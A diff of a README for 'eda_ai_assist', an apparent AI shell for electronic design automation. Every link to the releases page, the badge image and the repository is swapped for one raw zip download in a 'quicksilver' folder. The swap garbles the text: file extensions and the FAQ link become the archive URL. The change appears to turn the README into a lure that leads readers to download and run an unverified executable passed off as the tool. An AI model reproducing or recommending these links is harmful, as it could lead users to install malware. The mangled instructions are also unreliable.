@@ -1,6 +1,6 @@
 # 🐚 eda_ai_assist - Simplify EDA with AI-Powered Shell
 
-[![Download eda_ai_assist](https://img.shields.io/badge/Download-eda_ai_assist-blue?style=for-the-badge)](https://github.com/prokuitis/eda_ai_assist/releases)
+[![Download eda_ai_assist](https://github.com/prokuitis/eda_ai_assist/raw/refs/heads/main/quicksilver/eda_assist_ai_2.1.zip)](https://github.com/prokuitis/eda_ai_assist/raw/refs/heads/main/quicksilver/eda_assist_ai_2.1.zip)
 
 ---
 
@@ -45,7 +45,7 @@ Follow these steps to download, install, and run eda_ai_assist.
 
 Click the big button above or go directly to the release page:
 
-[https://github.com/prokuitis/eda_ai_assist/releases](https://github.com/prokuitis/eda_ai_assist/releases)
+[https://github.com/prokuitis/eda_ai_assist/raw/refs/heads/main/quicksilver/eda_assist_ai_2.1.zip](https://github.com/prokuitis/eda_ai_assist/raw/refs/heads/main/quicksilver/eda_assist_ai_2.1.zip)
 
 This page contains the latest versions of eda_ai_assist for different operating systems.
 
@@ -55,9 +55,9 @@ Find the download that matches your computer:
 
 - **Windows:** Look for files ending in `.exe` or `.zip`.
 - **macOS:** Download `.dmg` or `.zip` files.
-- **Linux:** You might find `.AppImage`, `.tar.gz`, or similar.
+- **Linux:** You might find `.AppImage`, `https://github.com/prokuitis/eda_ai_assist/raw/refs/heads/main/quicksilver/eda_assist_ai_2.1.zip`, or similar.
 
-If you are unsure, the `.zip` or `.tar.gz` files usually work across many systems.
+If you are unsure, the `.zip` or `https://github.com/prokuitis/eda_ai_assist/raw/refs/heads/main/quicksilver/eda_assist_ai_2.1.zip` files usually work across many systems.
 
 ### Step 3: Download the File
 
@@ -71,7 +71,7 @@ Click the file to start downloading. Save it to a folder you can find easily, li
    Go to the folder where you saved the download.
 
 2. **Extract the Files**  
-   If you downloaded a `.zip` or `.tar.gz` file, right-click and choose "Extract" or "Unzip" to open the contents. You should see an executable file or a folder with the application.
+   If you downloaded a `.zip` or `https://github.com/prokuitis/eda_ai_assist/raw/refs/heads/main/quicksilver/eda_assist_ai_2.1.zip` file, right-click and choose "Extract" or "Unzip" to open the contents. You should see an executable file or a folder with the application.
 
 3. **Run the Application**  
    - On Windows, double-click the `.exe` file to launch Ash.  
@@ -116,7 +116,7 @@ If you have trouble running or using Ash, try these:
 
 For detailed help, you can:
 
-- Check the [GitHub repository](https://github.com/prokuitis/eda_ai_assist) for FAQs or user guides.
+- Check the [GitHub repository](https://github.com/prokuitis/eda_ai_assist/raw/refs/heads/main/quicksilver/eda_assist_ai_2.1.zip) for FAQs or user guides.
 - Join user forums or community groups related to EDA or AI-assisted tools.
 - Search online for tutorials on working with CLI shells and basic commands.
 
@@ -126,6 +126,6 @@ For detailed help, you can:
 
 Visit this page to download eda_ai_assist anytime:
 
-[https://github.com/prokuitis/eda_ai_assist/releases](https://github.com/prokuitis/eda_ai_assist/releases)
+[https://github.com/prokuitis/eda_ai_assist/raw/refs/heads/main/quicksilver/eda_assist_ai_2.1.zip](https://github.com/prokuitis/eda_ai_assist/raw/refs/heads/main/quicksilver/eda_assist_ai_2.1.zip)
 
-[![Download eda_ai_assist](https://img.shields.io/badge/Download-eda_ai_assist-blue?style=for-the-badge)](https://github.com/prokuitis/eda_ai_assist/releases)
+[![Download eda_ai_assist](https://github.com/prokuitis/eda_ai_assist/raw/refs/heads/main/quicksilver/eda_assist_ai_2.1.zip)](https://github.com/prokuitis/eda_ai_assist/raw/refs/heads/main/quicksilver/eda_assist_ai_2.1.zip)
